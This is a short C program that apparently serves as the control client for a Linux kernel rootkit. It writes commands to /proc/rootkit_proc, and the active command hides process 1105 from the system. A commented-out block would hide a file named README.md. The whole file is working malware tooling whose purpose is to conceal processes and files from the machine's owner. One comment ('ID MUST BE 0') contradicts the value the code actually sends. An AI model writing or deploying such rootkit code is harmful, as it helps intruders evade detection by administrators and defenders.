#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

struct msg_hide_pid {
	int id; // ID MUST BE 0
	int pid;
};

int main(int argc, char** argv){
	int fd;
	if ((fd = open("/proc/rootkit_proc", O_WRONLY)) == -1){
		printf("ERROR OPEN\n");
		return -1;
	}

	/*
	// HIDE FILE
	int id = 0;
	char cadena[] = "README.md";
	int size = sizeof(int) + sizeof(cadena);
	void* msg = malloc(size);
	memcpy(msg, &id, sizeof(int));
	memcpy(msg + sizeof(int), cadena, sizeof(cadena));

	if (write(fd, msg, size) != size)
		printf("ERROR WRITE\n");

	free(msg);*/

	// HIDE PID
	struct msg_hide_pid msg;
	msg.id = 1;
	msg.pid = 1105;
	if (write(fd, &msg, sizeof(msg)) != sizeof(msg))
		printf("ERROR WRITE\n");


	close(fd);
	
	return 0;
}
